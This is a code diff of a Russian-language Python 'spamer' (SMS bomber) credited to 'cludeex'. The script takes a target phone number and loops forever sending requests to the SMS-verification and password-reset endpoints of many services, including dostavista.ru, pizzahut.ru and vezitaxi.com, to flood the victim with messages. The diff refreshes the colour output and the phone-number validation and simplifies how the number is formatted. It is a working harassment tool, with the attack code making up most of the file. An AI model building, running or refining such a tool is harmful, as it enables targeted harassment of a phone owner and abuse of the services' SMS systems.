@@ -4,24 +4,37 @@
 import os, random, time, urllib
 try: import requests
 except: os.system("python -m pip install requests; spamer")
-def logo(num):
+class clr:
+  Red = '\033[91m'
+  Green = '\033[92m'
+  Yellow = '\033[93m'
+  Blue = '\033[94m'
+  Magenta = '\033[95m'
+  Cyan = '\033[96m'
+  White = '\033[97m'
+  Grey = '\033[90m'
+  BOLD = '\033[1m'
+  ITALIC = '\033[3m'
+  UNDERLINE = '\033[4m'
+  END = '\033[0m'
+def logo():
   os.system('cls' if os.name=='nt' else 'clear')
-  print("\033[32m┏━┓\n┃━╋━┳━┓┏━━┳━━┳━┳┳┓\n┣━┃╋┃╋┗┫┃┃┃┃┃┃┻┫┏┛\n┗━┫┏┻━━┻┻┻┻┻┻┻━┻┛\033[3"+str(num)+"m by cludeex\n\033[32m  ┗┛\033[0m")
-def main(t1me):
-  time.sleep(t1me)
-  logo(1)
-  _phone = input("\033[34m(79XXXXXXXXX)>> \033[0m")
+  print(clr.BOLD+clr.White+"┏━┓\n┃━╋━┳━┓┏━━┳━━┳━┳┳┓\n"+clr.Blue+"┣━┃╋┃╋┗┫┃┃┃┃┃┃┻┫┏┛\n"+clr.Red+"┗━┫┏┻━━┻┻┻┻┻┻┻━┻┛ "+clr.Grey+"by cludeex\n"+clr.Red+"  ┗┛"+clr.END)
+def main(t):
+  time.sleep(t)
+  logo()
+  _phone = input(clr.Cyan+"79XXXXXXXXX >> \033[0m")
   try:
     urllib.request.urlopen("http://google.com", timeout=1)
   except urllib.request.URLError:
-    logo(4)
-    print("\033[31m[!] Нет интернет соединения :(\033[0m")
+    logo()
+    print(clr.Red+"[!] Нет интернет соединения :("+clr.END)
     main(2)
-  if (len(_phone) == 11 and (_phone[0] == "7" or _phone[0] == "8")) or (len(_phone) == 12 and _phone[0] == "+"):
+  if (len(_phone) == 11 and (_phone[0] == "7" or _phone[0] == "8") and _phone[1] == "9") or (len(_phone) == 12 and _phone[0] == "+" and _phone[1] == "7" and _phone[2] == "9"):
     pass
   else:
-    logo(4)
-    print("\033[31m[!] Неправильный номер.\033[0m")
+    logo()
+    print(clr.Red+"[!] Неправильный номер :("+clr.END)
     main(2)
   if _phone[0] == "+":
     _phone = _phone[1:]
@@ -36,16 +49,10 @@ def main(t1me):
     password = _name + random.choice(list("123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"))
     username = _name + random.choice(list("123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"))
   _phone9 = _phone[1:]
-  _phoneAresBank = "+"+ _phone[0]+"("+ _phone[1:4]+")"+ _phone[4:7]+"-"+ _phone[7:9]+"-"+ _phone[9:11]
-  _phone9dostavista =  _phone9[:3]+"+"+ _phone9[3:6]+"-"+ _phone9[6:8]+"-"+ _phone9[8:10]
-  _phoneOstin = "+"+ _phone[0]+"+("+ _phone[1:4]+")"+ _phone[4:7]+"-"+ _phone[7:9]+"-"+ _phone[9:11]
-  _phonePizzahut = "+" + _phone[0]+" ("+ _phone[1:4]+") "+ _phone[4:7]+" "+ _phone[7:9]+" "+ _phone[9:11]
-  _phoneGorzdrav =  _phone[1:4]+") "+ _phone[4:7]+"-"+ _phone[7:9]+"-"+ _phone[9:11]
-  iteration = 0
-  _email = _name+f"{iteration}"+"@gmail.com"
+  _email = _name+"@gmail.com"
   email = _email
-  logo(1)
-  print("\033[37mТелефон: \033[34m"+_phone+"\n\033[37mСпамер запущен.\033[0m\n")
+  logo()
+  print("Телефон: "+clr.Cyan+_phone+clr.END+"\nСпамер запущен.")
   while True:
     try:
       try:
@@ -133,7 +140,7 @@ def main(t1me):
       except:
         pass
       try:
-        requests.post("https://dostavista.ru/backend/send-verification-sms", data={"phone": _phone9dostavista})
+        requests.post("https://dostavista.ru/backend/send-verification-sms", data={"phone": _phone9})
       except:
         pass
       try:
@@ -301,7 +308,7 @@ def main(t1me):
       except:
         pass
       try:
-        requests.post("https://pizzahut.ru/account/password-reset", data={"reset_by":"phone", "action_id":"pass-recovery", "phone": _phonePizzahut, "_token":"*"})
+        requests.post("https://pizzahut.ru/account/password-reset", data={"reset_by":"phone", "action_id":"pass-recovery", "phone": _phone, "_token":"*"})
       except:
         pass
       try:
@@ -488,10 +495,8 @@ def main(t1me):
         requests.get("https://vezitaxi.com/api/employment/getsmscode", params={"phone": "+" + _phone, "city": 561, "callback": "jsonp_callback_35979"})
       except:
         pass
-      iteration += 1
-      print(("\033[37m{} круг пройден.\033[0m").format(iteration))
     except KeyboardInterrupt:
-      logo(1)
-      print("\033[37mТелефон: \033[34m"+_phone+"\n\033[37mСпамер остановлен.\033[0m")
+      logo()
+      print("Телефон: "+clr.Cyan+_phone+clr.END+"\nСпамер остановлен.")
       main(2)
 main(0)
